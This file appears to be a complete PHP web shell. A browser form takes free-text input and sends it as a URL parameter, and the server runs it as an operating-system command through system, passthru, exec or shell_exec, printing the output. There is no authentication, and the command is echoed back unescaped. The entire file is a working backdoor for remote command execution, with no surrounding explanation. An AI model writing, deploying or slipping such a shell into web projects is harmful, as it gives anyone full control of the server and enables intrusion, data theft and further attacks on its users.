<?php 
	header('Content-Type: text/html; charset=utf8');
?>
<html>
<head>
<script language="JavaScript">
function hex(d) {
	return d.toString(16);
}
function Encrypt(theText) {
	output = new String;
	Tmp = new String;
	Temp = new Array();
	TextSize = theText.length;
	for (i = 0; i < TextSize; i++) {
		Temp[i] = theText.charCodeAt(i);
	}
	for (i = 0; i < TextSize; i++) {
		Tmp = hex(Temp[i]);
		if (Tmp.length == 1) {
			Tmp = "0" + Tmp;
		}
		output += Tmp;
	}
	document.cmdform.cmd.value=encodeURIComponent(theText);
	document.cmdform.submit();
}
</script>
</head>
<body>
<center>
<form name="encform" onsubmit="return false;">
<textarea name="dcmd" rows="5" cols="50">
</textarea> 
<br/>
<input value="Execute" onclick="Encrypt(this.form.dcmd.value);" type="button"> 
<br/>
</form>
</center>
<form name="cmdform" method="GET" action="">
<input name="cmd" type="hidden" value="">
</form><br/>
<?php 
function hex2str($hex) {  
	for($i=0;$i<strlen($hex);$i+=2) {    
		$str.=chr(hexdec(substr($hex,$i,2)));  
	}  
	return $str;
}

if ($_GET['cmd']) { 
	if($_GET['sjis']==1) 
		$cmd = trim(mb_convert_encoding(urldecode($_GET['cmd']),"SJIS","UTF-8"));
	else 
		$cmd = trim(urldecode($_GET['cmd'])); 

?>
Command : <?php  echo $cmd  ?>
<br/>
<p>
<pre>
<?php 
	$cmd = "(".$cmd;$cmd .= ") 2>&1";
	if (!$_GET['type']) {
		system($cmd);
	} elseif ($_GET['type']==1) {
		passthru($cmd);
	} elseif ($_GET['type']==2) {
		echo (exec($cmd));
	} elseif ($_GET['type']==3) {
		$output = shell_exec($cmd);
		echo $output;
	} 
?>
</pre>
</p>
<?php } ?>